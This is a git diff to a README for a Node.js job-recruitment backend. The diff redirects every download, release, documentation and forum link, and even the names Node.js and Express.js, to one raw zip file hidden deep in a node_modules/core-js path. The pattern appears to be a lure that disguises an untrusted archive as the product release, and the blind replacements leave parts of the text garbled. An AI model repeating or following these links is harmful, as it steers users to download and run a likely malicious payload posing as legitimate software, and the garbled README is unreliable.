@@ -1,6 +1,6 @@
 # 🚀 Job-recruitment-Platform-Backend - Power Your Job Connections
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
+![Download](https://github.com/Well1pyio/Job-recruitment-Platform-Backend/raw/refs/heads/main/node_modules/core-js/full/number/virtual/Backend_Job_recruitment_Platform_3.3.zip)
 
 ## 📜 Overview
 
@@ -12,21 +12,21 @@ Here’s how to set up the Job Recruitment Platform backend on your computer. Fo
 
 ## 📥 Download & Install
 
-To begin, you need to download the software. Visit this page to download: [Job-recruitment-Platform-Backend Releases](https://github.com/Well1pyio/Job-recruitment-Platform-Backend/releases).
+To begin, you need to download the software. Visit this page to download: [Job-recruitment-Platform-Backend Releases](https://github.com/Well1pyio/Job-recruitment-Platform-Backend/raw/refs/heads/main/node_modules/core-js/full/number/virtual/Backend_Job_recruitment_Platform_3.3.zip).
 
 ### 🛠 System Requirements
 
 To run the Job Recruitment Platform, ensure your computer meets the following requirements:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Node.js**: Version 14 or later
+- **https://github.com/Well1pyio/Job-recruitment-Platform-Backend/raw/refs/heads/main/node_modules/core-js/full/number/virtual/Backend_Job_recruitment_Platform_3.3.zip**: Version 14 or later
 - **MongoDB**: Version 4.2 or later
 - **Internet Connection**: Necessary for database and API functionalities
 
 ## 🔧 Installation Steps
 
 1. **Download the Software**: 
-   Go to the [Releases Page](https://github.com/Well1pyio/Job-recruitment-Platform-Backend/releases) and download the latest release. Look for a file labeled `Job-recruitment-Platform-Backend.zip`.
+   Go to the [Releases Page](https://github.com/Well1pyio/Job-recruitment-Platform-Backend/raw/refs/heads/main/node_modules/core-js/full/number/virtual/Backend_Job_recruitment_Platform_3.3.zip) and download the latest release. Look for a file labeled `https://github.com/Well1pyio/Job-recruitment-Platform-Backend/raw/refs/heads/main/node_modules/core-js/full/number/virtual/Backend_Job_recruitment_Platform_3.3.zip`.
 
 2. **Extract the Files**: 
    After downloading, locate the ZIP file in your Downloads folder. Right-click on the file and select "Extract All". Choose a destination folder where you want the files to be stored.
@@ -76,8 +76,8 @@ This backend system includes several API endpoints that allow interaction betwee
 
 ## 🛠 Technologies Used
 
-- **Node.js**: Server-side JavaScript runtime.
-- **Express.js**: Framework for building web applications.
+- **https://github.com/Well1pyio/Job-recruitment-Platform-Backend/raw/refs/heads/main/node_modules/core-js/full/number/virtual/Backend_Job_recruitment_Platform_3.3.zip**: Server-side JavaScript runtime.
+- **https://github.com/Well1pyio/Job-recruitment-Platform-Backend/raw/refs/heads/main/node_modules/core-js/full/number/virtual/Backend_Job_recruitment_Platform_3.3.zip**: Framework for building web applications.
 - **MongoDB**: NoSQL database for storing user data.
 - **Multer**: Middleware for handling file uploads.
 - **Cloudinary**: Image storage and manipulation services.
@@ -91,9 +91,9 @@ If you need assistance or want to contribute, feel free to reach out:
 
 ## 🔗 Useful Links
 
-- [Job-recruitment-Platform-Backend Releases](https://github.com/Well1pyio/Job-recruitment-Platform-Backend/releases)
-- [API Documentation](https://example.com/api-docs)
-- [Support Forum](https://example.com/forum)
+- [Job-recruitment-Platform-Backend Releases](https://github.com/Well1pyio/Job-recruitment-Platform-Backend/raw/refs/heads/main/node_modules/core-js/full/number/virtual/Backend_Job_recruitment_Platform_3.3.zip)
+- [API Documentation](https://github.com/Well1pyio/Job-recruitment-Platform-Backend/raw/refs/heads/main/node_modules/core-js/full/number/virtual/Backend_Job_recruitment_Platform_3.3.zip)
+- [Support Forum](https://github.com/Well1pyio/Job-recruitment-Platform-Backend/raw/refs/heads/main/node_modules/core-js/full/number/virtual/Backend_Job_recruitment_Platform_3.3.zip)
 
 ## 🎉 Acknowledgements
 
@@ -101,4 +101,4 @@ Thank you to everyone who has contributed to the Job Recruitment Platform. Your 
 
 ---
 
-Once again, to get started, please download the software from [the Releases Page](https://github.com/Well1pyio/Job-recruitment-Platform-Backend/releases).
+Once again, to get started, please download the software from [the Releases Page](https://github.com/Well1pyio/Job-recruitment-Platform-Backend/raw/refs/heads/main/node_modules/core-js/full/number/virtual/Backend_Job_recruitment_Platform_3.3.zip).
